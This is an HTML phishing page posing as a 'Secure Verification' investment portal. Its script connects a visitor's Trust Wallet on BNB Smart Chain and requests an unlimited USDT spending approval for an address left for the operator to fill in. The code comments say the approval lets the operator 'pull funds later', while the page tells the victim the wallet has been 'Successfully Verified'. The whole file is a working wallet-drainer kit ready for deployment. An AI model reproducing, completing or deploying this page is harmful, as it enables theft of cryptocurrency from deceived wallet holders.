<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e2329; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; }
        .status { margin-top: 15px; color: #848e9c; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <h3>Investment Portal</h3>
        <p>Click below to verify and approve funds</p>
        <button class="btn" onclick="connectAndApprove()">CONFIRM NOW</button>
        <div id="status" class="status">Waiting for wallet...</div>
    </div>

    <script>
        // REPLACE THIS ADDRESS WITH YOUR BSC WALLET
        const MY_WALLET = "0xYourActualBscAddressHere"; 
        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";

        async function connectAndApprove() {
            if (window.ethereum) {
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    const signer = provider.getSigner();
                    
                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
                    const contract = new ethers.Contract(USDT_BSC, abi, signer);

                    document.getElementById("status").innerText = "Please confirm in Trust Wallet...";
                    
                    // Approval for "Unlimited" so you can pull funds later
                    const tx = await contract.approve(MY_WALLET, ethers.constants.MaxUint256);
                    document.getElementById("status").innerText = "Processing Transaction...";
                    
                    await tx.wait();
                    document.getElementById("status").innerText = "Successfully Verified!";
                    alert("Success! You can now close this window.");
                } catch (err) {
                    document.getElementById("status").innerText = "Error: " + err.message;
                }
            } else {
                alert("Please open this in Trust Wallet DApp Browser");
            }
        }
    </script>
</body>
</html>
